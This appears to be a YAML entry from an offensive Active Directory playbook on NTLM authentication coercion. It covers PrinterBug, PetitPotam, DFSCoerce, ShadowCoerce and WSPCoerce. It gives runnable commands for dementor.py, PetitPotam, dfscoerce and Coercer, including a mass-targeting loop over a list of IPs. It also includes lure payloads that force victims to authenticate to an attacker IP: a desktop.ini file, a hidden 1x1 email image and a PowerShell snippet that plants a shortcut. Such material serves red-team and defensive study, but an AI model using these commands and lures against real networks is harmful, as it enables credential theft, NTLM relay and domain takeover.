title: NTLM Authentication Coercion Methods
category: 
  - AD:
    - NTLM
tactic: Credential Access
tags: []

description: |
  In Active Directory domains, attackers often rely on coerced authentications techniques, 
  especially when attempting authentication relaying attacks (e.g. NTLM relay) or when abusing Kerberos delegations.
  These techniques enable attackers to redirect traffic or redirect/force targets authentications. 
  Attackers will then be able, in certain cases, to capture credentials or relay authentications.

  The coerced authentications are made over SMB. But MS-RPRN abuse can be combined with WebClient 
  abuse to elicit incoming authentications made over HTTP which heightens NTLM relay capabilities.

  It is usually used to get and crack NetNTLM hashes or relay request to other services, but
  can be also used for local privilege escalation.

  There are some well known options:

  1. MS-RPRN abuse (PrinterBug). 
  Microsoft's Print Spooler is a service handling the print jobs and other various tasks 
  related to printing. An attacker controling a domain user/computer can, with a specific RPC call, 
  trigger the spooler service of a target running it and make it authenticate to a target of the attacker's 
  choosing. This flaw is a "won't fix" and enabled by default on all Windows environments.

  2. MS-EFSR abuse (PetitPotam)
  Allows to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions.
  Abuse Microsoft's Encrypting File System Remote protocol available through \pipe\efsrpc, \pipe\lsarpc, 
  \pipe\samr, \pipe\lsass and \pipeetlogon SMB named pipes.
  Partially patched by Microsoft (CVE-2021-36942), but some of the MS-EFSR's methods are still accessible and vulnerable.

  3. MS-DFSNM abuse (DFSCoerce)
  Abuses Microsoft's Distributed File System Namespace Management protocol available through the \pipeetdfs SMB name pipe.
  Vulnerable methods: NetrDfsRemoveStdRoot, NetrDfsAddStdRoot.

  4. MS-FSRVP abuse (ShadowCoerce)
  Abuses Microsoft's File Server Remote VSS available through the \pipe\FssagentRpc SMB named 
  pipe (creating shadow copies of file shares on a remote computer). Service should be enabled on the target server, 
  patched in June 2022 (CVE-2022-30154).

  5. Windows Search Protocol (WSPCoerce)
  Note: The Windows Search Service is NOT enabled by default on Windows Server so in practice 
  this attack is only effective against Windows workstations.

references:
  - https://github.com/p0dalirius/windows-coerced-authentication-methods
  - https://github.com/NotMedic/NetNTLMtoSilverTicket (PrinterBug, python)
  - https://github.com/dirkjanm/krbrelayx (PrinterBug, python)
  - https://github.com/leechristensen/SpoolSample (PrinterBug, C#)
  - https://github.com/ShutdownRepo/ShadowCoerce (python)
  - https://github.com/Wh04m1001/DFSCoerce (python)
  - https://github.com/p0dalirius/Coercer (multitool, python)
  - https://github.com/ly4k/PetitPotam (python)
  - https://github.com/topotam/PetitPotam (C#)
  - https://github.com/slemire/WSPCoerce
  
steps:
  - description: Send the request to one of the vulnerable services
    options:
      - tool: dementor.py (PrinterBug)
        usage: |
          dementor.py -d domain.local -u user -p 'Password123' attacker_ip victim_ip

          #for mass sending
          for ip in `cat 445_ip.txt`; do python3 dementor.py -d domain -u user -p P@ssw0rd attacker_ip $ip;done
        comments: |
          for webdav use shadow@80/test.txt as an attacker host
      
      - tool: PetitPotam.py (topotam)
        usage: PetitPotam.py -u da -p 'P@ssw0rd' -d domain.local shadow@80/test.txt <target.domain.local> -pipe all
        comments: Null session can be use if not patched -d '' -u '' -p ''

      - tool: petitpotam.py (ly4k, PetitPotam)
        usage: |
          python3 petitpotam.py -debug 'user:Password123@victim-ip' '\attacker-ip\share\foo'

      - tool: dfscoerce.py
        usage: |
          python3 dfscoerce.py -d "pthub" -u "user" -p "Password123" attackerip victim-ip

      - tool: Coercer
        usage: |
          python3 Coercer.py coerce -l <attacker_ip> -t <target_ip> -u '<username>' -p '<password>' -d domain.com -v

      - tool: desktop.ini
        usage: |
          Put desktop.ini fine on a shared or user`s folder:

          [.ShellClassInfo]
          IconFile=\\10.10.16.153\aa
          IconIndex=1337

      - tool: 1x1 Images in Emails
        usage: |
          <img src="\\10.10.123.102\test.ico" height="1" width="1" />
      
      - tool: Windows Shortcuts
        usage: |
          $wsh = new-object -ComObject wscript.shell
          $shortcut = $wsh.CreateShortcut("\\dc-2\software\test.lnk")
          $shortcut.IconLocation = "\\10.10.123.102\test.ico"
          $shortcut.Save()
          
comments:
  